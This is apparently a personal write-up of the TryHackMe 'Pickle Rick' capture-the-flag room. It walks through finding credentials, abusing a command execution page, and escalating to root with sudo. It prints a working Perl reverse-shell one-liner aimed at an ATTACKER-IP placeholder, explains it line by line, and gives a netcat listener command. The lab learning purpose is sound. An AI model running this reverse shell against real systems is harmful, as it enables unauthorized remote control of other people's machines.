# **[Pickle Rick](https://tryhackme.com/room/picklerick) : Let's see how to pwn this room**
- You can get a username from Page resource
- You can get a key from /robots.txt
- Then login with those credentials in login.php
- You’ll get a command execution page, with restrictions.
- We can execute this perl reverse shell:(python) doesnt worked

```
perl -e 'use Socket;$i="ATTACKER-IP";$p=LISTENING-PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Attacker machine  : nc -lvnp port

### **How the Perl Reverse Shell Works**

This Perl script establishes a TCP connection back to your machine (**`ATTACKER-IP`**) on a specified port (**`LISTENING-PORT`**). Once connected, it redirects the target machine's input/output streams (**`STDIN`**, **`STDOUT`**, **`STDERR`**) to the socket, then spawns an interactive shell (**`/bin/sh -i`**).

```
perl -e 'use Socket;$i="ATTACKER-IP";$p=LISTENING-PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

1. **`use Socket;`**
    - Loads Perl’s **`Socket`** module (for network operations).
2. **`$i="ATTACKER-IP"; $p=LISTENING-PORT;`**
    - Sets the attacker’s IP (**`$i`**) and listening port (**`$p`**).
3. **`socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));`**
    - Creates a TCP socket (**`SOCK_STREAM`**) named **`S`**.
4. **`if(connect(S, sockaddr_in($p, inet_aton($i)))){ ... }`**
    - Attempts to connect to the attacker’s machine (**`$i:$p`**).
    - **`sockaddr_in`** constructs the target address/port.
    - **`inet_aton`** converts the IP to binary format.
5. **`open(STDIN, ">&S"); open(STDOUT, ">&S"); open(STDERR, ">&S");`**
    - Redirects the target’s standard input/output/error to the socket **`S`**.
    - This means any command you type in your **`nc`** listener will be sent to the target’s shell, and its output will be sent back to you.
6. **`exec("/bin/sh -i");`**
    - Spawns an interactive shell (**`i`** flag makes it "interactive" with proper prompts).
    - The shell’s I/O is now tied to the socket.

Then second flag is in /home/rick

We can use double-quotes to access file, which contains white spaces in its name.
```perl
cat "file name"
```

### Third flag:

```perl
$ sudo -l
Matching Defaults entries for www-data on ip-10-10-193-202:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-193-202:
    (ALL) NOPASSWD: ALL

```

From this we can understand that we can run any command with root permission.

Final flag is in /root

> Learnt the basics of reverse shell, and privilege escalation.
>
